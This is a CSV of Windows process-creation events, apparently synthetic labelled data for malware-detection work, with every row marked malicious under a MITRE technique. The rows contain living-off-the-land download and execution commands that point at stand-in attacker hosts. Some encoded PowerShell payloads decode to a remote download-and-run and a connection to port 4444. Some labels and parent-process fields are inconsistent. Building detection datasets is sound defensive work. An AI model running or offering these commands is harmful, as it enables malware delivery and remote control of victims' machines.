UtcTime,ProcessGuid,ProcessId,Image,CommandLine,ParentImage,ParentCommandLine,ParentProcessId,User,IntegrityLevel,is_malicious,mitre_technique_id,technique_name,label
2024-07-04T04:34:21.828Z,{CF26A060-0412-4830-A478-0FA459975194},57339,C:\Windows\System32\bitsadmin.exe,bitsadmin /transfer job1678 http://cobaltstrike5366.org/runtime637.exe C:\Users\Public\svc677.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,cmd.exe,36424,CORP\klee,Medium,1,T1197,BITSAdmin Download,malicious
2024-07-01T16:12:49.643Z,{C751BBD5-F0ED-4584-947A-D9EB64C46C3E},13009,C:\Windows\System32\cmd.exe,cmd.exe /c powershell.exe -ep bypass -enc SQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAKABHAGUAdAAtAEMAbwBuAHQAZQBuAHQAIABDADoAXABVAHMAZQByAHMAXABQAHUAYgBsAGkAYwBcAHAAYQB5AGwAbwBhAGQALgBwAHMAMQApAA==,C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE,"""C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE"" /n document38.docm",51114,CORP\pchen,Medium,1,T1204.002,Office Macro Execution,malicious
2024-07-07T04:24:43.323Z,{CDEF8705-2809-4926-BF4D-0528006FCF7B},64030,C:\Windows\System32\certutil.exe,certutil  -urlcache -split -f http://stager6543.ru/downloads/runtime488.exe C:\Users\Public\sys972.exe,C:\Windows\System32\cmd.exe,powershell.exe,35750,CORP\klee,Medium,1,T1105,Certutil Download,malicious
2024-07-01T11:57:56.468Z,{83A2B14B-29F9-4461-9FD5-25B2EE357C33},6721,C:\Windows\System32\rundll32.exe,"rundll32.exe javascript:""\..\mshtml,RunHTMLApplication "";eval(""window.close"")",C:\Windows\System32\cmd.exe,explorer.exe,6254,CORP\mjones,Medium,1,T1218.011,Rundll32 JavaScript,malicious
2024-07-03T02:23:11.210Z,{BC6BC10D-AE79-482B-ABC8-3517BD7BAD19},37863,C:\Windows\System32\rundll32.exe,"rundll32.exe javascript:""\..\mshtml,RunHTMLApplication "";eval(""window.close"")",C:\Windows\explorer.exe,explorer.exe,47342,CORP\jsmith,Medium,1,T1218.011,Rundll32 JavaScript,malicious
2024-07-05T02:57:00.427Z,{2794CA43-F573-4776-9FF0-D4B64123A90D},65237,C:\Windows\System32\regsvr32.exe,regsvr32 /s /n /u /i:http://phish-host7024.xyz/payloads/file254.sct scrobj.dll,C:\Windows\System32\cmd.exe,cmd.exe /c,3898,CORP\klee,Medium,1,T1218.010,Regsvr32 Squiblydoo,malicious
2024-07-02T20:10:03.279Z,{AA3E9119-15C5-43EF-9526-48D17C98112A},24669,C:\Windows\System32\cmd.exe,cmd.exe /c powershell.exe -nop -w hidden -enc JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtADsASQBFAFgAKABbAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABzACkAKQA=,C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE,"""C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE"" /n document41.docm",28493,CORP\klee,Medium,1,T1204.002,Office Macro Execution,malicious
2024-07-03T03:47:29.229Z,{E662B569-946C-43D1-8568-3676350E5BE1},2758,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtADsASQBFAFgAKABbAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABzACkAKQA=,C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE,WINWORD.EXE /n,52853,CORP\klee,Medium,1,T1059.001,PowerShell Encoded Command,malicious
2024-07-01T01:58:38.210Z,{65EC55EE-705D-4C6E-995A-62A8B0B14185},39509,C:\Windows\System32\cmd.exe,cmd.exe /c powershell.exe -ep bypass -enc JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AUwBvAGMAawBlAHQAcwAuAFQAQwBQAEMAbABpAGUAbgB0ACgAJwAxADAALgAwAC4AMAAuADEAJwAsADQANAA0ADQAKQA7ACQAcwA9ACQAYwAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA=,C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE,"""C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE"" /n document6.docm",60059,CORP\jsmith,Medium,1,T1204.002,Office Macro Execution,malicious
2024-07-01T18:21:03.345Z,{A79F8EA2-5616-4B72-B364-DCB6F7FC57AA},52627,C:\Windows\System32\mshta.exe,"mshta vbscript:Execute(""CreateObject(""""Wscript.Shell"""").Run """"http://stager6379.net/script812.hta"""""")",C:\Windows\System32\cmd.exe,cmd.exe,48252,CORP\klee,Medium,1,T1218.005,Mshta Remote HTA,malicious
2024-07-04T12:59:40.545Z,{8B8360AD-EC29-4A6E-BE62-33571E124121},54014,C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe,C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe C:\Users\Public\core721.csproj,C:\Windows\System32\cmd.exe,cmd.exe,41266,CORP\agarwal,Medium,1,T1127.001,MSBuild Inline Task,malicious
2024-07-05T04:22:50.078Z,{0248A4B5-72F3-47CA-8838-10CE97503B04},43699,C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe,C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe C:\Users\Public\sys865.csproj,C:\Windows\System32\cmd.exe,cmd.exe,54984,CORP\mjones,Medium,1,T1127.001,MSBuild Inline Task,malicious
2024-07-03T04:00:55.642Z,{7F3CEA07-D7F3-497E-AEB5-FA193C7956E6},5633,C:\Windows\System32\rundll32.exe,"rundll32.exe javascript:""\..\mshtml,RunHTMLApplication "";document.write();new%20ActiveXObject(""WScript.Shell"").Run(""cmd /c update466.exe"")",C:\Windows\explorer.exe,cmd.exe,26223,CORP\klee,Medium,1,T1218.011,Rundll32 JavaScript,malicious
2024-07-03T20:43:44.704Z,{17BC1B3D-C560-4CF4-9B13-73AD56C099CB},24758,C:\Windows\System32\cmd.exe,cmd.exe /c powershell -noni -nop -w hidden -enc QQBkAGQALQBUAHkAcABlACAALQBBAHMAcwBlAG0AYgBsAHkATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4ARAByAGEAdwBpAG4AZwA7ACQAZwA9AFsARAByAGEAdwBpAG4AZwAuAEIAaQB0AG0AYQBwAF0AOgA6AG4AZQB3ACgAJAB1ACkA,C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE,"""C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE"" /n document42.docm",7280,CORP\mjones,Medium,1,T1204.002,Office Macro Execution,malicious
2024-07-03T04:39:59.164Z,{0C9EA3D1-9DEB-43A0-BD5B-E8BB8D740F35},47649,C:\Windows\System32\rundll32.exe,"rundll32.exe javascript:""\..\mshtml,RunHTMLApplication "";document.write();new%20ActiveXObject(""WScript.Shell"").Run(""cmd /c runtime233.exe"")",C:\Windows\System32\cmd.exe,cmd.exe,36082,CORP\jsmith,Medium,1,T1218.011,Rundll32 JavaScript,malicious
2024-07-03T10:23:30.732Z,{D8F3F73B-74FB-42B1-B877-1ED83CBC5E97},25100,C:\Windows\System32\cscript.exe,cscript.exe //e:vbscript http://beacon-drop6149.net/script434.vbs,C:\Windows\System32\cmd.exe,cmd.exe /c,54829,CORP\klee,Medium,1,T1059.005,WScript Remote Script,malicious
2024-07-04T19:32:14.417Z,{FA6F86AF-248C-471F-ADEE-25FABEE3DACC},8395,C:\Windows\System32\bitsadmin.exe,bitsadmin.exe /transfer job3133 /download /priority high http://dropper-srv7787.cc/sys604.exe C:\Users\Public\loader690.exe,C:\Windows\System32\cmd.exe,cmd.exe,50899,CORP\mjones,Medium,1,T1197,BITSAdmin Download,malicious
2024-07-01T21:06:33.106Z,{74245DDB-2BA1-4C98-B4ED-5E10B9BCCA68},45924,C:\Windows\System32\certutil.exe,certutil.exe -urlcache -split -f http://darkops9655.xyz/module346.exe C:\Users\Public\core707.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,cmd.exe,30225,CORP\jsmith,Medium,1,T1105,Certutil Download,malicious
2024-07-01T21:53:46.862Z,{F02C0592-5EED-496B-8502-07511D2BEBE0},10211,C:\Windows\System32\wscript.exe,wscript.exe //e:jscript http://malware-cdn5153.top/script923.js,C:\Windows\System32\cmd.exe,cmd.exe /c,16469,CORP\klee,Medium,1,T1059.005,WScript Remote Script,malicious
2024-07-05T04:32:17.150Z,{8283D610-675B-4D08-A90B-9CD9ACF58DD0},51331,C:\Windows\System32\bitsadmin.exe,bitsadmin /transfer job9634 http://dropper-srv6968.ru/runtime784.exe C:\Users\Public\driver280.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,cmd.exe,30794,CORP\mjones,Medium,1,T1197,BITSAdmin Download,malicious
2024-07-06T03:20:53.987Z,{FA445198-2B84-45C7-9E16-237F7E2C5AEA},52976,C:\Windows\System32\mshta.exe,"mshta vbscript:Execute(""CreateObject(""""Wscript.Shell"""").Run """"http://dropper-srv1752.net/script510.hta"""""")",C:\Windows\explorer.exe,cmd.exe,14974,CORP\agarwal,Medium,1,T1218.005,Mshta Remote HTA,malicious
2024-07-03T03:37:01.783Z,{6EA1A1F9-9DC0-49AE-A8F1-3FCBE52C6BD5},59415,C:\Windows\Microsoft.NET\Framework\v3.5\MSBuild.exe,C:\Windows\Microsoft.NET\Framework\v3.5\MSBuild.exe C:\Users\Public\runtime329.csproj,C:\Windows\System32\cmd.exe,powershell.exe,41970,CORP\jsmith,Medium,1,T1127.001,MSBuild Inline Task,malicious
2024-07-02T22:30:53.473Z,{58CAEF99-469C-4D05-B65A-7BF294EDF4B0},19295,C:\Windows\System32\regsvr32.exe,regsvr32 /s /n /u /i:http://cobaltstrike2794.xyz/payloads/file89.sct scrobj.dll,C:\Windows\System32\cmd.exe,cmd.exe /c,1950,CORP\klee,Medium,1,T1218.010,Regsvr32 Squiblydoo,malicious
2024-07-03T04:58:58.166Z,{2505ADC0-58C6-4BE9-8F9E-9C99A9C175FF},7712,C:\Windows\System32\cmd.exe,cmd.exe /c powershell.exe -nop -w hidden -enc QQBkAGQALQBUAHkAcABlACAALQBBAHMAcwBlAG0AYgBsAHkATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4ARAByAGEAdwBpAG4AZwA7ACQAZwA9AFsARAByAGEAdwBpAG4AZwAuAEIAaQB0AG0AYQBwAF0AOgA6AG4AZQB3ACgAJAB1ACkA,C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE"" /n document2.docm",15278,CORP\agarwal,Medium,1,T1204.002,Office Macro Execution,malicious
2024-07-04T02:05:20.056Z,{49E37D58-CE33-4620-B16E-970DDEE0B4A5},40855,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,powershell.exe -nop -w hidden -enc JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AUwBvAGMAawBlAHQAcwAuAFQAQwBQAEMAbABpAGUAbgB0ACgAJwAxADAALgAwAC4AMAAuADEAJwAsADQANAA0ADQAKQA7ACQAcwA9ACQAYwAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA=,C:\Windows\System32\cmd.exe,cmd.exe,43029,CORP\jsmith,Medium,1,T1059.001,PowerShell Encoded Command,malicious
2024-07-01T02:55:49.310Z,{9BB3C456-218B-4BB3-B985-4476A30EA859},58979,C:\Windows\System32\bitsadmin.exe,bitsadmin.exe /transfer job2051 /download http://beacon-drop299.com/files/installer902.exe C:\Users\Public\installer461.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,cmd.exe,47272,CORP\klee,Medium,1,T1197,BITSAdmin Download,malicious
2024-07-03T01:48:52.118Z,{A706327E-9234-46B3-B243-AE3F81ED3F67},4442,C:\Windows\System32\certutil.exe,certutil  -urlcache -split -f http://cobaltstrike2535.ru/downloads/installer789.exe C:\Users\Public\installer244.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,cmd.exe,11983,CORP\agarwal,Medium,1,T1105,Certutil Download,malicious
2024-07-03T02:46:58.944Z,{DAC798CA-F33D-4ABD-91E7-A738844BC621},29973,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,powershell.exe -nop -w hidden -enc JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtADsASQBFAFgAKABbAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABzACkAKQA=,C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE,cmd.exe,23196,CORP\mjones,Medium,1,T1059.001,PowerShell Encoded Command,malicious
2024-07-06T04:01:07.783Z,{6FB721FD-30F0-4DD3-9CBC-E2BE9F3C336B},19167,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,powershell.exe -ep bypass -nop -w hidden -enc JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtADsASQBFAFgAKABbAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABzACkAKQA=,C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE,cmd.exe,33312,CORP\klee,Medium,1,T1059.001,PowerShell Encoded Command,malicious
2024-07-04T21:19:36.135Z,{D936F078-E546-4AF9-88A4-C502AF1D8C1E},59869,C:\Windows\System32\rundll32.exe,"rundll32.exe javascript:""\..\mshtml,RunHTMLApplication "";document.write();new%20ActiveXObject(""WScript.Shell"").Run(""cmd /c installer593.exe"")",C:\Windows\System32\cmd.exe,explorer.exe,52730,CORP\pchen,Medium,1,T1218.011,Rundll32 JavaScript,malicious
2024-07-03T22:04:22.430Z,{88C0E78F-7C79-46E7-9A65-3E30AF8DBA60},40460,C:\Windows\System32\wscript.exe,wscript.exe //e:jscript http://phish-host6775.cc/script898.js,C:\Windows\System32\cmd.exe,cmd.exe /c,48790,CORP\jsmith,Medium,1,T1059.005,WScript Remote Script,malicious
2024-07-05T20:26:44.826Z,{0F29A547-D658-458D-8815-314DE1AD1E24},52920,C:\Windows\System32\mshta.exe,mshta.exe http://loader-cdn6172.org/payloads/script17.hta,C:\Windows\explorer.exe,cmd.exe,51630,CORP\agarwal,Medium,1,T1218.005,Mshta Remote HTA,malicious
2024-07-05T01:49:13.141Z,{34E70036-19B1-42FE-B8EB-84A6348AF128},65307,C:\Windows\System32\rundll32.exe,"rundll32.exe javascript:""\..\mshtml,RunHTMLApplication "";document.write();new%20ActiveXObject(""WScript.Shell"").Run(""cmd /c svc393.exe"")",C:\Windows\System32\cmd.exe,cmd.exe,22949,CORP\mjones,Medium,1,T1218.011,Rundll32 JavaScript,malicious
2024-07-02T16:02:24.676Z,{AB465630-F8CE-4666-820F-96C5AF0260D8},13517,C:\Windows\System32\mshta.exe,mshta.exe http://apt-infra1495.cc/payloads/script548.hta,C:\Windows\explorer.exe,explorer.exe,20586,CORP\mjones,Medium,1,T1218.005,Mshta Remote HTA,malicious
2024-07-02T08:12:01.737Z,{28356EA9-0D1D-43F1-BE0F-48A2FB52FA69},39859,C:\Windows\System32\mshta.exe,"mshta vbscript:Execute(""CreateObject(""""Wscript.Shell"""").Run """"http://phish-host6401.net/script646.hta"""""")",C:\Windows\System32\cmd.exe,cmd.exe,16629,CORP\klee,Medium,1,T1218.005,Mshta Remote HTA,malicious
2024-07-04T19:05:20.727Z,{98EAB616-86CE-4653-A2FA-C595CE2D19A9},35761,C:\Windows\System32\certutil.exe,certutil.exe -encode C:\Users\Public\decoded773.exe C:\Users\Public\encoded9267.txt,C:\Windows\System32\cmd.exe,powershell.exe,29372,CORP\klee,Medium,1,T1140,Certutil Base64 Decode,malicious
2024-07-05T02:02:47.144Z,{B49C83A5-1B03-4229-80CD-AE2E5BDAB54A},33040,C:\Windows\System32\mshta.exe,"mshta vbscript:Execute(""CreateObject(""""Wscript.Shell"""").Run """"http://evil-payload6653.net/script217.hta"""""")",C:\Windows\System32\cmd.exe,explorer.exe,43849,CORP\pchen,Medium,1,T1218.005,Mshta Remote HTA,malicious
2024-07-05T19:52:18.744Z,{FBED7CB6-80FE-48DB-A8B3-903E3404DF11},45380,C:\Windows\System32\certutil.exe,certutil.exe -encode C:\Users\Public\decoded4817.exe C:\Users\Public\encoded4461.txt,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,powershell.exe,13410,CORP\klee,Medium,1,T1140,Certutil Base64 Decode,malicious
2024-07-02T01:31:37.994Z,{679F07F7-35EF-4DD6-AFE0-16296AC8716F},25759,C:\Windows\System32\bitsadmin.exe,bitsadmin.exe /transfer job6474 /download /priority high http://c2-server8062.io/helper320.exe C:\Users\Public\loader783.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,cmd.exe,41431,CORP\klee,Medium,1,T1197,BITSAdmin Download,malicious
2024-07-05T16:45:35.719Z,{2B7A54C5-4ED5-4827-BE83-EDE646BF18BB},50565,C:\Windows\System32\cmd.exe,cmd.exe /c powershell.exe -nop -w hidden -enc QQBkAGQALQBUAHkAcABlACAALQBBAHMAcwBlAG0AYgBsAHkATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4ARAByAGEAdwBpAG4AZwA7ACQAZwA9AFsARAByAGEAdwBpAG4AZwAuAEIAaQB0AG0AYQBwAF0AOgA6AG4AZQB3ACgAJAB1ACkA,C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE,"""C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE"" /n document72.docm",53597,CORP\pchen,Medium,1,T1204.002,Office Macro Execution,malicious
2024-07-05T03:19:25.056Z,{6173EC51-F36C-40D9-84DD-3FF838C94038},42436,C:\Windows\System32\certutil.exe,certutil.exe -urlcache -split -f http://stager7154.io/sys800.exe C:\Users\Public\svc554.exe,C:\Windows\System32\cmd.exe,powershell.exe,63837,CORP\klee,Medium,1,T1105,Certutil Download,malicious
2024-07-04T20:28:30.894Z,{936B3E97-3723-476A-84F3-B79C2F37DA2C},49180,C:\Windows\System32\certutil.exe,certutil.exe -decode C:\Users\Public\encoded9534.txt C:\Users\Public\decoded1447.exe,C:\Windows\System32\cmd.exe,powershell.exe,9749,CORP\agarwal,Medium,1,T1140,Certutil Base64 Decode,malicious
2024-07-03T18:02:04.072Z,{2F59BDF8-58B2-44A5-8E7E-2C6DC1553BDB},38443,C:\Windows\System32\certutil.exe,certutil  -urlcache -split -f http://darkops6442.org/downloads/core504.exe C:\Users\Public\svc148.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,powershell.exe,48680,CORP\jsmith,Medium,1,T1105,Certutil Download,malicious
2024-07-06T04:02:50.675Z,{0EC60DAA-A7BA-45D6-9A17-5A61A036E63A},34651,C:\Windows\System32\cmd.exe,cmd.exe /c powershell -noni -nop -w hidden -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvAGUAdgBpAGwALgBjAG8AbQAvAHAAJwApAA==,C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE"" /n document98.docm",39874,CORP\jsmith,Medium,1,T1204.002,Office Macro Execution,malicious
2024-07-07T04:37:01.324Z,{29ECF114-F9B9-457D-A029-ED503031E35A},25755,C:\Windows\Microsoft.NET\Framework\v3.5\MSBuild.exe,C:\Windows\Microsoft.NET\Framework\v3.5\MSBuild.exe C:\Users\Public\svc346.csproj,C:\Windows\System32\cmd.exe,powershell.exe,38378,CORP\mjones,Medium,1,T1127.001,MSBuild Inline Task,malicious
2024-07-02T01:21:47.954Z,{5A676C35-00E5-4EAB-ADF5-70CCB76E8920},4592,C:\Windows\System32\rundll32.exe,"rundll32.exe javascript:""\..\mshtml,RunHTMLApplication "";document.write();new%20ActiveXObject(""WScript.Shell"").Run(""cmd /c update304.exe"")",C:\Windows\System32\cmd.exe,cmd.exe,34733,CORP\pchen,Medium,1,T1218.011,Rundll32 JavaScript,malicious
2024-07-03T02:24:53.905Z,{B6665F8F-98BF-4498-BE46-F21DF5E7D73E},38381,C:\Windows\System32\certutil.exe,certutil.exe -encode C:\Users\Public\decoded2942.exe C:\Users\Public\encoded4370.txt,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,cmd.exe,15711,CORP\agarwal,Medium,1,T1140,Certutil Base64 Decode,malicious
2024-07-04T10:53:37.612Z,{6FEF19CB-070D-4B55-B138-0920E024455B},6641,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,powershell.exe -exec bypass -noni -nop -w hidden -enc JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AUwBvAGMAawBlAHQAcwAuAFQAQwBQAEMAbABpAGUAbgB0ACgAJwAxADAALgAwAC4AMAAuADEAJwAsADQANAA0ADQAKQA7ACQAcwA9ACQAYwAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA=,C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE,WINWORD.EXE /n,10413,CORP\klee,Medium,1,T1059.001,PowerShell Encoded Command,malicious
